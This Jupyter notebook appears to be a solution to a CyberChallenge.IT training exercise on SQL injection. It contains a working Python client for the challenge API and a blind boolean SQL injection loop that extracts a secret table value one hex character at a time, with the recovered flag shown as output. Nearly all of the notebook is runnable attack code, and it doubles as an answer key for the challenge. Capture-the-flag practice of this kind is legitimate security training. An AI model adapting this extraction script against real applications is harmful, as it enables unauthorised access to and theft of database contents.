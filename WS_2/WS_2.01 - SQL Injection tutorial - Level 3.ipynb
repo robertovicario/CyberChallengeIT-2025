{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### WS_2.01 - SQL Injection tutorial - Level 3"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "class Inj:\n",
    "    def __init__(self, host):\n",
    "        self.sess = requests.Session()\n",
    "        self.base_url = '{}/api/'.format(host)\n",
    "        self._refresh_csrf_token()\n",
    "    \n",
    "    def _refresh_csrf_token(self):\n",
    "        resp = self.sess.get(self.base_url + 'get_token')\n",
    "        resp = resp.json()\n",
    "        self.token = resp['token']\n",
    "    \n",
    "    def _do_raw_req(self, url, query):\n",
    "        headers = {'X-CSRFToken': self.token}\n",
    "        data = {'query': query }\n",
    "        return self.sess.post(url,json=data, headers=headers).json()\n",
    "\n",
    "    def logic(self, query):\n",
    "        url = self.base_url + 'logic'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "    \n",
    "    def union(self, query):\n",
    "        url = self.base_url + 'union'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def blind(self, query):\n",
    "        url = self.base_url + 'blind'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def time(self, query):\n",
    "        url = self.base_url + 'time'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'CCIT{A_bl1ndy_fl4g}'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "inj = Inj('http://sqlinjection.challs.cyberchallenge.it')\n",
    "payload = \"1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{}%') = '1\"\n",
    "\n",
    "dictionary = '0123456789abcdef'\n",
    "flag = ''\n",
    "\n",
    "while True:\n",
    "    for character in dictionary:\n",
    "        question = payload.format(flag + character)\n",
    "        response, error = inj.blind(question)\n",
    "        \n",
    "        if response == 'Success':\n",
    "            flag += character\n",
    "            break\n",
    "    else:\n",
    "        break\n",
    "\n",
    "bytes.fromhex(flag).decode()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
